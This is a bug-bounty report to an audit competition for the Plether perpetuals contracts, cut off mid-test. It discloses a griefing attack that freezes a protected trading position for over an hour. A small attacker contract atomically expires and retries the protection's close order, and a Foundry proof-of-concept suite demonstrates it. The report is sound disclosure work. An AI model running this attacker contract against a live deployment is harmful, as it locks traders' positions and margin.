# \#98033 [SC-High] Atomic expire-and-retry keeps a triggered protection out of the Latched state, so the owner cannot amend close limits and the position stays locked for over an hour

**Submitted on Nov 4th 2026 at 14:03:30 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98033
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

`amendLatchedPositionProtectionCloseLimits` is the owner's only way to relax close limits that are stopping a triggered protection from filling. It needs the protection to be `Latched` with no pending order. Both conditions exist only between a failed attempt's cleanup and the next retry, and `expireOrder` and `retryPositionProtectionClose` are both permissionless, so one contract call can perform the cleanup and the retry in a single transaction. The owner never sees an amendable state. In the PoC, 61 cycles hold the protection `Triggered` for 3,721 seconds while a 10,000e18 position and 1,985.500999 USDG of isolated margin stay locked and every owner exit reverts. The attacker spends 57,070,793 gas, about 0.00117 ETH at the Arbitrum gas price measured for this report. In the same-snapshot control, where the cleanup is not followed by an atomic retry, the owner amends and the position closes 62 seconds after the first attempt, releasing 1,991.999994 USDG.

## Vulnerability Details

- Repository `immunefi-team/audit-comp-plether`, commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, `packages/perps/src`.
- Files: `PositionProtectionBook.sol`, `OrderRouter.sol`, `OrderRecoverySidecar.sol`, `router/OrderLiquidationBatchLogic.sol`.
- Impact: Medium, temporary freezing of funds for at least 1 hour.

### Root cause

A failed protection close relatches the protection: `handleFailedProtectionAttempt` sets `Triggered` back to `Latched` (`PositionProtectionBook.sol:637-667`, status written at `:666`) and the child order is deleted, leaving the account queue empty.

Amendment requires exactly that state, for the owner only:

- `amendLatchedPositionProtectionCloseLimits` (`PositionProtectionBook.sol:315-328`) resolves the protection through `_ownedActiveProtection(protectionId, msg.sender)`, reverts `OrderRouter__ProtectionNotLatched` unless the status is `Latched` (`:320-322`), and reverts `OrderRouter__PendingOrdersExist` unless `pendingOrderCounts(msg.sender)` is zero (`:323-325`).

Both inputs to that state are permissionless:

- `retryPositionProtectionClose` (`PositionProtectionBook.sol:382-405`) resolves the protection through `_activeProtection(protectionId)`, with no check on `msg.sender`, and commits a fresh attempt that restores `Triggered` with one live child.
- `expireOrder` (`OrderRouter.sol:191-196`, routed to `OrderRecoverySidecar.sol:49-64`) is callable by anyone once `block.timestamp > executionDeadline`, and performs the cleanup that relatches the protection.

So a contract that calls `expireOrder(child)` and then `retryPositionProtectionClose(protectionId)` in one transaction consumes the `Latched`, zero-pending state inside its own call frame. Between transactions the protection is always `Triggered` with `pendingOrderCounts(owner) == 1`, and the owner's amendment always reverts. The retry copies the unchanged limits into the next attempt, so the attempt that follows fails for the same reason, and the cycle repeats every execution window.

The other owner exits are closed while a protection is active:

- `_cancel` (`PositionProtectionBook.sol:408-420`) accepts only `PendingOpen` and `Armed`, so `cancelPositionProtection` reverts `OrderRouter__ProtectionNotArmed`.
- `cancelPositionProtectionAndCommitClose` (`:341-345`) and `replacePositionProtection` require `Armed` and revert the same way.
- An ordinary close, partial close or open reverts `OrderRouter__ProtectionActive` (`router/OrderLiquidationBatchLogic.sol:313-315`).

SECURITY.md:544 states that triggered and latched protections cannot use the manual exit, and SECURITY.md:547 that triggering is irreversible, so amendment followed by retry is the stated recovery once a close keeps failing. The Cecuro MED-9 disposition says the same in its remediation note: "Only the owner may amend the retained ceilings while protection is Latched", and "Tight limits may prevent execution until conditions improve or the owner amends them". SECURITY.md:1356-1359 tells operators to alert on a prolonged `Latched` state without a live child; this cycle keeps the protection `Triggered` with a live child, so that signal does not fire.

### Sequence

The fixture uses limits a real trader would set, not a degenerate one. Alice holds a 10,000e18 LONG opened with 2,000 USDG margin at index 1.00, with a take-profit trigger at 0.90 and `maxExecutionNotionalAssets` of 9,000 USDG, which bounds the close she expects at the trigger. The index recovers to 1.00 before a keeper executes, so the close needs 10,000 USDG of execution notional and fails her ceiling with `ConstraintViolation`, relatching the protection. Both the initial close and an honest keeper's retry really execute and really fail that bound.

1. The attacker contract calls `retryPositionProtectionClose(protectionId)`. The protection is `Triggered` with child `x0`.
2. At `orderTiming(x_i).executionDeadline + 1`, the attacker calls one function that runs `expireOrder(x_i)` and then `retryPositionProtectionClose(protectionId)`, producing `x_(i+1)`. The test asserts the window is the release `maxExecutionWindowSeconds` of 60 and that the deadline derives from the stored commit time, rather than assuming either.
3. After each cycle the test asserts the status is `Triggered` and `pendingOrderCounts(ALICE) == 1`.
4. After 61 cycles, Alice's amendment reverts `OrderRouter__ProtectionNotLatched`.

Only Pyth and USDG are mocks, as the program allows. `setUp` asserts the DEPLOYMENT.md release parameters it depends on, including the 60-second execution window, the 0.04% execution fee, the 5-order pending cap and the 200,000 trigger bounty.

### Known issues

- Cecuro MED-9 is the finding that introduced these retained ceilings and owner amendment. Its remediation presents amendment as the owner's recovery and does not describe any way for a third party to deny it.
- AI MED-15 leaves a protection stuck `Latched` after a zero-price slippage floor. That is a stuck `Latched` state with no live child, which is the state operators are told to alert on, and it is not reached here.
- SECURITY.md:1356-1359 accepts unpaid cleanup and permissionless zero-bounty retries. It covers who pays for cleanup, not the owner losing the amendment state.

### Recommended fix

Let the owner amend when the live child can no longer execute. In `amendLatchedPositionProtectionCloseLimits`, accept `Triggered` as well as `Latched` when the protection's `linkedOrderId` is past its `executionDeadline`, and keep the pending-order check scoped to orders that are still executable. An expired child cannot fill, so the amendment changes no in-flight outcome, and the attacker loses the window it relies on: it can only act after that deadline, which is exactly when the owner becomes able to amend. Blocking a non-owner `retryPositionProtectionClose` for a short interval after a relatch would also work, at the cost of delaying honest keeper retries.

## Impact Details

Measured at the end of the 61 cycles, against the same values at the moment of the latch:

| | Attack | Control |
| --- | ---: | ---: |
| Elapsed seconds | 3,721 | 62 |
| Position size | 10,000e18 | 0 |
| Isolated margin, USDG | 1,985.500999 | 0 |
| Free settlement, USDG | 17,999.800000 | 19,991.799994 |
| Protection status | Triggered | Executed |
| Owner amendment | `ProtectionNotLatched` | succeeds |

The control starts from the identical snapshot and differs in one thing: the cleanup is not followed by an atomic retry. The owner then amends, an honest keeper retries, and the close executes, releasing 1,991.999994 USDG to free settlement at a cost of 3.501005 USDG in execution and carry.

What is frozen is the position and its isolated margin. Alice's unrelated free settlement balance stays withdrawable: a 1 USDG withdrawal succeeds during the attack, and only a withdrawal of her whole internal balance reverts with `InsufficientFreeEquity`. `addMargin` succeeds but does not close or unlock anything.

Attacker cost, measured: 935,586 gas per cycle on average (935,515 minimum, 938,014 maximum), 57,070,793 gas over 61 cycles. The Arbitrum One public RPC returned `eth_gasPrice` of 0.020036 gwei on 2026-11-04 at 13:38 UTC, which puts the 61 cycles at about 0.00114 ETH, or about 0.00117 ETH including 21,000 base gas per transaction. The attacker receives nothing: each retry creates a fresh zero-bounty close record.

Limits, all executed:

- An owner whose account is a contract escapes, by calling `expireOrder`, `amendLatchedPositionProtectionCloseLimits` and `retryPositionProtectionClose` in one transaction, for 946,188 gas. The freeze therefore applies to externally owned accounts. `perps-aa` is out of scope, so this report does not rely on it.
- An honest keeper's ordinary retry also leaves the protection `Triggered`, so it blocks amendment in the same way while its child is live. The difference the attack makes is that the amendable state never exists between transactions.
- Retry is permissionless by design (SECURITY.md:550), and the documentation does not state an amendment interval.
- The cycle ends if a close becomes executable within the owner's original limits: at a 0.90 index the close fits the 9,000 USDG ceiling and executes. It also ends on liquidation, which at a 1.50 index removes the position, the live child and the trade lock.
- Router pause, a FAD window and a frozen oracle do not end the cycle; the attacker's atomic replacement still succeeds in all three.
- The freeze lasts as long as the attacker keeps paying each window. 3,721 seconds was executed; longer durations were not.

## References

- `packages/perps/src/PositionProtectionBook.sol:315-328` (`amendLatchedPositionProtectionCloseLimits`), `:341-345`, `:382-405` (`retryPositionProtectionClose`), `:408-420` (`_cancel`), `:637-667` (`handleFailedProtectionAttempt`, status written at `:666`)
- `packages/perps/src/OrderRouter.sol:191-196` (`expireOrder`); `packages/perps/src/OrderRecoverySidecar.sol:49-64`
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:313-315`
- `packages/perps/SECURITY.md:544`, `:547`, `:550`, `:1356-1359`
- Cecuro audit, MED-9 remediation note (owner amendment of retained ceilings)

## Proof of Concept

Path: `packages/perps/test/perps/poc/AtomicProtectionRetry.t.sol` (full source below). It uses the repo's `BasePerpTest`.

Command, from `packages/perps` at the pin with Forge 1.5.1:

```bash
FOUNDRY_PROFILE=quick forge test --offline --match-path test/perps/poc/AtomicProtectionRetry.t.sol -vv
```

Observed output:

```text
[PASS] test_AtomicExpireRetry_61Cycles_RealisticLimit_AndSplitTransactionControl() (gas: 52877536)
Logs:
  ATTACK elapsed seconds 3721
  ATTACK position size 10000000000000000000000
  ATTACK position margin 1985500999
  ATTACK free settlement 17999800000
  ATTACK internal balance 19995300999
  ATTACK gas total 61 cycles 57070793
  ATTACK gas min cycle 935515
  ATTACK gas max cycle 938014
  ATTACK gas average cycle 935586
  CONTROL elapsed seconds 62
  CONTROL position size 0
  CONTROL position margin 0
  CONTROL free settlement 19991799994
  CONTROL internal balance 19991799994
  CONTROL net free-settlement release 1991999994
  CONTROL execution and carry cost 3501005
[PASS] test_ContractOwner_BatchedExpireAmendRetryEscapes() (gas: 5971052)
Logs:
  CONTRACT OWNER expire+amend+retry gas 946188
[PASS] test_HonestRetryAlsoBlocksAmendment_ButSuccessfulCloseEndsCycle() (gas: 5766671)
[PASS] test_LiquidationEndsCycle() (gas: 5581947)
[PASS] test_OwnerActionMatrix_WhileAttackerKeepsOneChildLive() (gas: 5644330)
[PASS] test_PauseFadAndFrozenRegimesDoNotEndCycle() (gas: 6614671)
Suite result: ok. 6 passed; 0 failed; 0 skipped
```

`test_OwnerActionMatrix_WhileAttackerKeepsOneChildLive` records every owner action while one child is live: amend reverts `ProtectionNotLatched`; cancel, cancel-and-close and replace revert `ProtectionNotArmed`; a full close, a half close, an open and an attached open revert `ProtectionActive`; a new protection reverts `ProtectionAlreadyActive`; `addMargin` and a withdrawal of excess free settlement succeed without unlocking the position; a withdrawal of the whole internal balance reverts `InsufficientFreeEquity`; an early `expireOrder` reverts `OrderNotExpired`; and the owner executing the child herself fails with `ConstraintViolation` and relatches.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

interface IL20ExpiryRouter {
    function expireOrder(uint64 orderId) external returns (OrderV3Types.ExecutionResult memory result);
}

contract L20AtomicRetryAttacker {
    function retry(
        IPositionProtectionActions book,
        uint64 protectionId
    ) external returns (uint64 orderId) {
        return book.retryPositionProtectionClose(protectionId);
    }

    function expireOnly(IL20ExpiryRouter router, uint64 orderId) external {
        router.expireOrder(orderId);
    }

    function cycle(
        IL20ExpiryRouter router,
        IPositionProtectionActions book,
        uint64 orderId,
        uint64 protectionId
    ) external returns (uint64 nextOrderId) {
        router.expireOrder(orderId);
        return book.retryPositionProtectionClose(protectionId);
    }
}

contract L20ContractProtectionOwner {
    function expireAmendRetry(
        IL20ExpiryRouter router,
        IPositionProtectionActions book,
        uint64 orderId,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external returns (uint64 nextOrderId) {
        router.expireOrder(orderId);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, limits);
        return book.retryPositionProtectionClose(protectionId);
    }
}

contract L20AtomicProtectionRetryTest is BasePerpTest {
    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);
    address internal constant HONEST_KEEPER = address(0xCA201);

    uint256 internal constant MARK_PRICE = 100_000_000;
    uint256 internal constant TRIGGER_PRICE = 90_000_000;
    uint256 internal constant RECOVERY_PRICE = MARK_PRICE;
    uint256 internal constant LIQUIDATION_PRICE = 150_000_000;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2_000e6;
    uint256 internal constant REALISTIC_NOTIONAL_CEILING = 9_000e6;
    uint256 internal constant FRIDAY_FAD_START = 1_709_933_400;
    uint256 internal constant CYCLES = 61;

    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    L20AtomicRetryAttacker internal attacker;

    struct ArmObservation {
        uint256 elapsedSeconds;
        uint256 positionSize;
        uint256 positionMargin;
        uint256 freeSettlement;
        uint256 internalBalance;
        uint256 totalGas;
        uint256 minGas;
        uint256 maxGas;
        uint64 finalOrderId;
        PositionProtectionTypes.PositionProtectionStatus status;
    }

    function setUp() public override {
        super.setUp();

        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2_500;
        config.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(config);
        _setSeniorCapacity(40_000_000e6, 8_000);

        uint256 t = SETUP_TIMESTAMP + 8 days;
        vm.warp(t);
        assertEq(block.timestamp, t);

        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        attacker = new L20AtomicRetryAttacker();

        _fundTrader(ALICE, 20_000e6);
        _fundTrader(HONEST_KEEPER, 1_000e6);
        _refreshMark(MARK_PRICE);
        _assertReleaseParameters();
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
    }

    function _assertReleaseParameters() internal view {
        CfdTypes.RiskParams memory params = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(engine.CAP_PRICE(), 2e8, "release CAP_PRICE");
        assertEq(params.vpiFactor, 0.01e18, "release vpiFactor");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen spread");
        assertEq(params.maxSkewRatio, 0.4e18, "release maxSkewRatio");
        assertEq(params.maintMarginBps, 10, "release maintenance margin");
        assertEq(params.initMarginBps, 20, "release initial margin");
        assertEq(params.fadMarginBps, 300, "release FAD margin");
        assertEq(params.baseCarryBps, 500, "release carry");
        assertEq(params.minBountyAssets, 1e6, "release minimum bounty");
        assertEq(params.bountyBps, 10, "release liquidation charge");
        assertEq(params.keeperShareBps, 5_000, "release keeper share");
        assertEq(params.protocolShareBps, 0, "release protocol share");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(engine.fadRunwaySeconds(), 1 hours, "release FAD runway");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release basket confidence");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2_500, "release adverse confidence");
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "release minimum open");
        assertEq(router.maxPendingOrders(), 5, "release pending cap");
        assertEq(router.positionProtectionTriggerBountyAssets(), 200_000, "release trigger bounty");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release senior exposure");
        assertEq(pool.maxSeniorShareBps(), 8_000, "release senior share");
        assertEq(router.maxExecutionWindowSeconds(), 60, "release execution window");
    }

    function test_AtomicExpireRetry_61Cycles_RealisticLimit_AndSplitTransactionControl() public {
        (uint64 protectionId,) = _latchedRealisticFixture(ALICE);
        uint256 marginAtLatch = _positionMargin(ALICE);
        uint256 freeAtLatch = _freeSettlementAssets(ALICE);
        uint256 balanceAtLatch = clearinghouse.balanceAssets(ALICE);
        uint256 snapshot = vm.snapshotState();

        ArmObservation memory attack;
        attack.finalOrderId = attacker.retry(protectionActions, protectionId);
        uint256 startedAt = vm.getBlockTimestamp();
        attack.minGas = type(uint256).max;

        for (uint256 i; i < CYCLES; ++i) {
            OrderV3Types.OrderTiming memory timing = router.lifecycleBook().orderTiming(attack.finalOrderId);
            assertEq(timing.executionWindowSeconds, router.maxExecutionWindowSeconds(), "actual attempt window");
            assertEq(
                timing.executionDeadline,
                uint64(timing.commitTimestamp) + timing.executionWindowSeconds,
                "deadline derives from commit and stored window"
            );
            uint256 t = uint256(timing.executionDeadline) + 1;
            vm.warp(t);
            assertEq(block.timestamp, t, "time warp must survive via-IR");

            uint256 gasBefore = gasleft();
            attack.finalOrderId = attacker.cycle(
                IL20ExpiryRouter(address(router)), protectionActions, attack.finalOrderId, protectionId
            );
            uint256 cycleGas = gasBefore - gasleft();
            attack.totalGas += cycleGas;
            if (cycleGas < attack.minGas) attack.minGas = cycleGas;
            if (cycleGas > attack.maxGas) attack.maxGas = cycleGas;

            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "atomic retry restores Triggered"
            );
            assertEq(router.pendingOrderCounts(ALICE), 1, "atomic retry leaves one live child");
        }

        attack.elapsedSeconds = vm.getBlockTimestamp() - startedAt;
        attack.positionSize = _positionSize(ALICE);
        attack.positionMargin = _positionMargin(ALICE);
        attack.freeSettlement = _freeSettlementAssets(ALICE);
        attack.internalBalance = clearinghouse.balanceAssets(ALICE);
        attack.status = protectionViews.getPositionProtection(protectionId).status;

        assertEq(attack.elapsedSeconds, CYCLES * (router.maxExecutionWindowSeconds() + 1), "61 real deadlines");
        assertGe(attack.elapsedSeconds, 1 hours, "Medium duration threshold reached");
        assertEq(attack.positionSize, POSITION_SIZE, "attack leaves full position open");
        assertEq(attack.positionMargin, marginAtLatch, "attack leaves isolated margin locked");
        assertEq(attack.freeSettlement, freeAtLatch, "cycles do not release free settlement");
        assertEq(attack.internalBalance, balanceAtLatch, "cycles do not release internal balance");
        assertEq(uint8(attack.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());

        console2.log("ATTACK elapsed seconds", attack.elapsedSeconds);
        console2.log("ATTACK position size", attack.positionSize);
        console2.log("ATTACK position margin", attack.positionMargin);
        console2.log("ATTACK free settlement", attack.freeSettlement);
        console2.log("ATTACK internal balance", attack.internalBalance);
        console2.log("ATTACK gas total 61 cycles", attack.totalGas);
        console2.log("ATTACK gas min cycle", attack.minGas);
        console2.log("ATTACK gas max cycle", attack.maxGas);
        console2.log("ATTACK gas average cycle", attack.totalGas / CYCLES);

        assertTrue(vm.revertToState(snapshot), "control must start from the identical latch snapshot");
        ArmObservation memory control;
        control.finalOrderId = attacker.retry(protectionActions, protectionId);
        startedAt = vm.getBlockTimestamp();
        uint256 firstDeadline = uint256(router.lifecycleBook().orderTiming(control.finalOrderId).executionDeadline);
        uint256 controlTime = firstDeadline + 1;
        vm.warp(controlTime);
        assertEq(block.timestamp, controlTime);

        attacker.expireOnly(IL20ExpiryRouter(address(router)), control.finalOrderId);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "expiry without atomic retry exposes Latched"
        );
        assertEq(router.pendingOrderCounts(ALICE), 0, "expiry-only exposes an empty account queue");

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());
        vm.prank(HONEST_KEEPER);
        control.finalOrderId = protectionActions.retryPositionProtectionClose(protectionId);

        bytes[] memory executionData = _mockPythUpdateData(RECOVERY_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(control.finalOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended control closes");

        control.elapsedSeconds = vm.getBlockTimestamp() - startedAt;
        control.positionSize = _positionSize(ALICE);
        control.positionMargin = _positionMargin(ALICE);
        control.freeSettlement = _freeSettlementAssets(ALICE);
        control.internalBalance = clearinghouse.balanceAssets(ALICE);
        control.status = protectionViews.getPositionProtection(protectionId).status;

        assertEq(control.positionSize, 0, "control closes the position");
        assertEq(control.positionMargin, 0, "control releases all isolated margin");
        assertGt(control.freeSettlement, freeAtLatch, "control releases position-linked value to free settlement");
        assertEq(engine.traderClaimBalanceAssets(ALICE), 0, "release pool fully funds the control payout");
        assertEq(uint8(control.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Executed));

        console2.log("CONTROL elapsed seconds", control.elapsedSeconds);
        console2.log("CONTROL position size", control.positionSize);
        console2.log("CONTROL position margin", control.positionMargin);
        console2.log("CONTROL free settlement", control.freeSettlement);
        console2.log("CONTROL internal balance", control.internalBalance);
        console2.log("CONTROL net free-settlement release", control.freeSettlement - freeAtLatch);
        console2.log("CONTROL execution and carry cost", balanceAtLatch - control.internalBalance);
    }

    function test_OwnerActionMatrix_WhileAttackerKeepsOneChildLive() public {
        (uint64 protectionId,) = _latchedRealisticFixture(ALICE);
        uint64 orderId = attacker.retry(protectionActions, protectionId);
        OrderV3Types.OrderRequest memory request = _boundedRequest(POSITION_SIZE, true);
        PositionProtectionTypes.PositionProtectionParams memory replacement = _realisticParams();

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, request);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(protectionId, replacement);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(request);

        request.sizeDelta = POSITION_SIZE / 2;
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(request);

        request = _boundedRequest(POSITION_SIZE, false);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(request);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        protectionActions.commitOpenOrderWithProtection(request, replacement);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionAlreadyActive.selector);
        protectionActions.createPositionProtection(replacement);

        uint256 marginBefore = _positionMargin(ALICE);
        vm.prank(ALICE);
        engine.addMargin(ALICE, 100e6);
        assertEq(_positionMargin(ALICE), marginBefore + 100e6, "add margin works but does not close or unlock");
        assertEq(_positionSize(ALICE), POSITION_SIZE);

        uint256 walletBefore = settlementToken.balanceOf(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdraw(ALICE, 1e6);
        assertEq(settlementToken.balanceOf(ALICE), walletBefore + 1e6, "only excess free settlement withdraws");
        assertEq(_positionSize(ALICE), POSITION_SIZE, "free withdrawal does not free the position");

        uint256 totalBalance = clearinghouse.balanceAssets(ALICE);
        vm.prank(ALICE);
        vm.expectRevert(MarginClearinghouse.MarginClearinghouse__InsufficientFreeEquity.selector);
        clearinghouse.withdraw(ALICE, totalBalance);

        vm.prank(ALICE);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__NoTraderClaim.selector);
        engine.settleTraderClaim(ALICE);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotExpired.selector);
        router.expireOrder(orderId);

        bytes[] memory executionData = _mockPythUpdateData(RECOVERY_PRICE);
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "owner execution still fails bound");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "owner execution relatches through the same realistic constraint"
        );
        assertEq(_positionSize(ALICE), POSITION_SIZE);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
    }

    function test_HonestRetryAlsoBlocksAmendment_ButSuccessfulCloseEndsCycle() public {
        (uint64 protectionId,) = _latchedRealisticFixture(ALICE);
        uint64 orderId = attacker.retry(protectionActions, protectionId);
        _warpPastDeadline(orderId);
        attacker.expireOnly(IL20ExpiryRouter(address(router)), orderId);

        vm.prank(HONEST_KEEPER);
        orderId = protectionActions.retryPositionProtectionClose(protectionId);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimitedLimits());

        bytes[] memory executionData = _mockPythUpdateData(TRIGGER_PRICE);
        vm.prank(HONEST_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "conditions improving fills close");
        assertEq(_positionSize(ALICE), 0);
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Executed)
        );
    }

    function test_LiquidationEndsCycle() public {
        (uint64 protectionId,) = _latchedRealisticFixture(ALICE);
        uint64 orderId = attacker.retry(protectionActions, protectionId);
        _warpPastDeadline(orderId);
        orderId = attacker.cycle(IL20ExpiryRouter(address(router)), protectionActions, orderId, protectionId);
        assertEq(router.pendingOrderCounts(ALICE), 1);

        _mockPythUpdateData(LIQUIDATION_PRICE);
        bytes[] memory liquidationData = _livePriceData(LIQUIDATION_PRICE);
        vm.prank(EXECUTION_KEEPER);
        router.executeLiquidation(ALICE, liquidationData);

        assertEq(_positionSize(ALICE), 0, "liquidation removes the position");
        assertEq(router.pendingOrderCounts(ALICE), 0, "liquidation removes the live retry child");
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "liquidation clears the trade lock");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated)
        );
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotFound.selector);
        protectionActions.retryPositionProtectionClose(protectionId);
    }

    function test_PauseFadAndFrozenRegimesDoNotEndCycle() public {
        (uint64 protectionId,) = _latchedRealisticFixture(ALICE);
        uint64 orderId = attacker.retry(protectionActions, protectionId);
        uint256 snapshot = vm.snapshotState();

        routerAdmin.pause();
        _warpPastDeadline(orderId);
        uint64 pausedOrder = attacker.cycle(IL20ExpiryRouter(address(router)), protectionActions, orderId, protectionId);
        assertTrue(routerAdmin.paused());
        assertGt(pausedOrder, orderId, "pause does not prevent atomic replacement");
        _assertStillTriggeredWithPosition(ALICE, protectionId);

        assertTrue(vm.revertToState(snapshot));
        uint256 fadTime = FRIDAY_FAD_START + 7 days - 45 minutes;
        vm.warp(fadTime);
        assertEq(block.timestamp, fadTime);
        assertTrue(engine.isFadWindow(), "FAD-only fixture");
        assertFalse(engine.isOracleFrozen(), "FAD-only is not frozen");
        _warpPastDeadline(orderId);
        uint64 fadOrder = attacker.cycle(IL20ExpiryRouter(address(router)), protectionActions, orderId, protectionId);
        assertGt(fadOrder, orderId, "FAD does not prevent atomic replacement");
        _assertStillTriggeredWithPosition(ALICE, protectionId);

        assertTrue(vm.revertToState(snapshot));
        uint256 frozenTime = FRIDAY_FAD_START + 7 days + 3 hours;
        vm.warp(frozenTime);
        assertEq(block.timestamp, frozenTime);
        assertTrue(engine.isOracleFrozen(), "frozen fixture");
        _warpPastDeadline(orderId);
        uint64 frozenOrder = attacker.cycle(IL20ExpiryRouter(address(router)), protectionActions, orderId, protectionId);
        assertGt(frozenOrder, orderId, "frozen market does not prevent atomic replacement");
        _assertStillTriggeredWithPosition(ALICE, protectionId);
    }

    function test_ContractOwner_BatchedExpireAmendRetryEscapes() public {
        L20ContractProtectionOwner owner = new L20ContractProtectionOwner();
        address account = address(owner);
        _fundTrader(account, 20_000e6);
        (uint64 protectionId,) = _latchedRealisticFixture(account);
        uint64 orderId = attacker.retry(protectionActions, protectionId);
        _warpPastDeadline(orderId);

        uint256 gasBefore = gasleft();
        uint64 retryId = owner.expireAmendRetry(
